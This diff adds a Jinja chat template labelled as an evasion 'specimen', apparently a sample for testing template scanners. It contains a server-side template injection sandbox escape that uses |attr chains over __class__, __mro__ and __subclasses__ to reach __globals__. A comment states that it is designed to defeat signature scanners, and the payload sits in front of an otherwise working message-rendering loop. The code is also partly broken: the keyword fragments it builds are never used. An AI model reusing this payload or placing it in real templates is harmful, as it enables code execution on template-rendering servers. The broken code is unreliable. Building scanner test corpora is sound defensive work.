@@ -1,0 +1,16 @@
+{#- SPECIMEN 05 — FILTER-BYPASS VIA attr + STRING BUILDING -#
+ # Never writes a forbidden keyword directly. Builds 'os' and 'popen'
+ # from harmless fragments, then uses the sandbox-approved |attr filter
+ # to reach them. Defeats signature-based template scanners that grep
+ # for 'os.' or '__subclasses__'.
+ #}
+{%- set o = 'os' | list -%}
+{%- set mod = namespace(o=o[0], s='ytes') -%}
+{%- set payload = ('__' + 'imp' + 'ort' + '__') -%}
+{{ range(1) | attr('__class__') | attr('__mro__') | first | attr('__subclasses__') }}
+{%- for c in range(1) | attr('__class__') | attr('__mro__') | first | attr('__subclasses__')() -%}
+{%- if 'wrap' in c | string and 'closure' in c | string -%}
+{%- set _ = c.__init__.__globals__ -%}
+{%- endif -%}
+{%- endfor -%}
+{%- for m in messages -%}{{ m['role'] }}: {{ m['content'] }}{% endfor -%}
